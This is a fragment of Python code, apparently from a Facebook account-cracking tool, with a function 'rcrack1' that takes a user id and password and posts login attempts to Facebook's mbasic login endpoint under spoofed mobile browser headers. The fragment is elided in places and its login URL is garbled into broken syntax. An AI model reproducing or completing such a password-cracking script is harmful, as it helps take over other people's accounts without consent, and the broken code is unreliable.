...
def rcrack1(uid,pwx,tl):
    ...
    'dpr': '1.4375',
    'referer': 'https://mbasic.facebook.com/login.com',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Chromium";v="103", ".Not/A)Brand";v="99"',
    'sec-ch-ua-full-version-list': '"Chromium";v="103.0.5060.104", ".Not/A)Brand";v="99.0.0.0"',
    'sec-ch-ua-mobile': '?1',
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            lo = session.post('https://mbasic.facebook.com/login.php'php'device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
